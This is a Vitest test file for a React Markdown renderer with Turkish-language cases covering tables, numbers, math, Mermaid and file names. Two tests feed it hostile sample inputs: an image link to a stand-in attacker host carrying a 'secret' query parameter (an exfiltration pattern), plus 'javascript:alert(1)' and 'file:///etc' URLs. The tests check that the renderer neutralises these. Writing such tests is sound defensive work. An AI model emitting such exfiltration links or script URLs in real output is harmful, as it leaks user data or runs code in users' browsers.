import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import {
  cellNumber,
  compareCells,
  hardBreaks,
  looksLikeFile,
  repairTables,
  Markdown,
  mathDelimiters,
  snippetName,
  webLink,
} from './Markdown';
import { textOf } from './Mermaid';

describe('Markdown', () => {
  it('leaves a table inside a longer code fence alone', () => {
    const text = ['````md', '```', 'a | b', 'c | d', '```', '````'].join('\n');
    expect(repairTables(text)).toBe(text);
  });

  it('reads a typeset minus as a minus', () => {
    expect(cellNumber('\u22125')).toBe(-5);
    expect(cellNumber('\u20ba\u22121.250,50')).toBe(-1250.5);
  });

  it('strikes text only between double tildes', () => {
    const html = renderToStaticMarkup(<Markdown text="~5 ile ~10 dakika arası, ~~eski plan~~" />);
    expect(html).toContain('~5 ile ~10 dakika');
    expect(html).toContain('<del>eski plan</del>');
  });

  it('does not load an image from another address; it offers it as a link', () => {
    const html = renderToStaticMarkup(
      <Markdown text="Bak: ![grafik](https://evil.example/p.gif?d=gizli) ve ![](https://cdn.example/a.png)" />,
    );
    expect(html).not.toContain('<img');
    expect(html).toContain('href="https://evil.example/p.gif?d=gizli"');
    expect(html).toContain('>grafik</a>');
    expect(html).toContain('>cdn.example</a>');
  });

  it('shows only the description of an image it cannot link to', () => {
    const html = renderToStaticMarkup(
      <Markdown text="![resim](data:image/gif;base64,R0lGOD) ![js](javascript:alert(1)) ![yol](/api/x)" />,
    );
    expect(html).not.toContain('<img');
    expect(html).not.toContain('javascript:');
    expect(html).toContain('resim');
    expect(html).toContain('yol');
  });

  it('links only web addresses', () => {
    expect(webLink('https://a.example/x')?.hostname).toBe('a.example');
    expect(webLink('http://a.example')).not.toBeNull();
    for (const bad of [
      undefined,
      '',
      '/api/x',
      'data:image/png;base64,AA',
      'javascript:alert(1)',
      'file:///etc',
    ]) {
      expect(webLink(bad)).toBeNull();
    }
  });

  it('kişinin satırlarını korur; kod bloğunun içine dokunmaz', () => {
    expect(hardBreaks('bir\niki\n\n- a\n- b')).toBe('bir\\\niki\n\n- a\n- b');
    expect(hardBreaks('Liste:\n1. a')).toBe('Liste:\n1. a');
    expect(hardBreaks('```\nx\ny\n```\nson')).toBe('```\nx\ny\n```\nson');
  });

  it('formülü dizer; tek dolar işaretini fiyat olarak bırakır', () => {
    const html = renderToStaticMarkup(
      <Markdown text={'Toplam $5 ve $10. Alan $$\\pi r^2$$ olur.\n\n```math\nE = mc^2\n```'} />,
    );
    expect(html.match(/class="katex"/g)).toHaveLength(2);
    expect(html).toContain('Toplam $5 ve $10.');
    expect(mathDelimiters('a \\(x+1\\) b')).toBe('a $$x+1$$ b');
    expect(mathDelimiters('\\[y\\]')).toBe('\n$$\ny\n$$\n');
    expect(mathDelimiters('`\\(kod\\)`')).toBe('`\\(kod\\)`');
  });
});

describe('kod bloğu dosya adı', () => {
  it('dile göre uzantı verir', () => {
    expect(snippetName('Python')).toBe('snippet.py');
    expect(snippetName('ts')).toBe('snippet.ts');
    expect(snippetName('dockerfile')).toBe('Dockerfile');
    expect(snippetName('brainfuck')).toBe('snippet.txt');
    expect(snippetName(null)).toBe('snippet.txt');
  });
});

describe('Mermaid', () => {
  it('çizilene kadar kaynağı kod olarak gösterir', () => {
    const html = renderToStaticMarkup(<Markdown text={'```mermaid\ngraph TD\n  A --> B\n```'} />);
    expect(html).toContain('graph TD');
    expect(html).not.toContain('data-language');
  });
  it('kod öğesinin metnini toplar', () => {
    expect(textOf(<code>{['graph ', <span key="x">TD</span>]}</code>)).toBe('graph TD');
  });
});

describe('tablo sıralama', () => {
  it('hücreyi sayı olarak okur', () => {
    expect(cellNumber('1,234.5')).toBe(1234.5);
    expect(cellNumber('1.234,5')).toBe(1234.5);
    expect(cellNumber('$40')).toBe(40);
    expect(cellNumber('%12')).toBe(12);
    expect(cellNumber('12%')).toBe(12);
    expect(cellNumber('-3')).toBe(-3);
    expect(cellNumber('abc')).toBeNull();
    expect(cellNumber('1-2')).toBeNull();
  });
  it('sayıları sayı, sözcükleri dile göre karşılaştırır', () => {
    expect(['10', '9', '100'].sort((a, b) => compareCells(a, b, 'tr'))).toEqual(['9', '10', '100']);
    expect(['Zeynep', 'çınar', 'Ali'].sort((a, b) => compareCells(a, b, 'tr'))).toEqual([
      'Ali',
      'çınar',
      'Zeynep',
    ]);
  });
});

describe('düz metindeki dosya adı', () => {
  it('belge, veri ve görsel adlarını tanır; komut ve adresleri tanımaz', () => {
    for (const ok of [
      'rapor.pdf',
      'out/data.csv',
      '/data/workspaces/bots/b/files/özet.md',
      'Bütçe 2026.xlsx'.replace(' ', '_'),
    ])
      expect(looksLikeFile(ok), ok).toBe(true);
    for (const no of ['npm install', 'https://ornek.com/a.pdf', 'v1.2', 'config', '.env', 'a b.pdf'])
      expect(looksLikeFile(no), no).toBe(false);
  });
});

describe('tablo onarımı', () => {
  it('başlığın altına eksik ya da kısa ayraç satırını koyar', () => {
    expect(repairTables('| Ad | Tutar |\n| Ali | 9 |')).toBe('| Ad | Tutar |\n| --- | --- |\n| Ali | 9 |');
    expect(repairTables('| A | B | C |\n|---|\n| 1 | 2 | 3 |')).toBe(
      '| A | B | C |\n| --- | --- | --- |\n| 1 | 2 | 3 |',
    );
  });
  it('paragrafa yapışık tabloyu ayırır, doğru tabloya ve koda dokunmaz', () => {
    expect(repairTables('Sonuçlar:\n| A | B |\n|---|---|\n| 1 | 2 |')).toBe(
      'Sonuçlar:\n\n| A | B |\n|---|---|\n| 1 | 2 |',
    );
    const ok = '| A | B |\n| :-- | --: |\n| 1 | 2 |';
    expect(repairTables(ok)).toBe(ok);
    const code = '```\n| a | b |\n| c | d |\n```';
    expect(repairTables(code)).toBe(code);
  });
  it('onarılan tablo tablo olarak çizilir', () => {
    expect(renderToStaticMarkup(<Markdown text={'| Ad | Tutar |\n| Ali | 9 |'} />)).toContain('<table');
  });
});
